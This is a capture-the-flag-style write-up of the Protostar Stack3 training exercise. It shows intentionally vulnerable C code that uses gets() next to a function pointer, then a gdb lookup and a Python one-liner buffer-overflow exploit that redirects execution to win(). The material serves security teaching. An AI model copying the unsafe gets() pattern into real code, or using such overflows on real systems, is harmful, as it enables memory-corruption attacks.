#### Protostar Stack3

##### About
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)  

###### Hints
* both gdb and objdump is your friend you determining where the win() function lies in memory.  
  
This level is at /opt/protostar/bin/stack3

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Use BOF to change the value of the function pointer fp, make it point to the address of function win().

##### Solution
```
$ gdb stack3
......
(gdb) print win
$1 = {void (void)} 0x8048424 <win>
......
(gdb) quit
$ python -c "print 'A'*64+'\x24\x84\x04\x08'" | ./stack3
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>  
<https://thesprawl.org/research/exploit-exercises-protostar-stack/#stack-3>
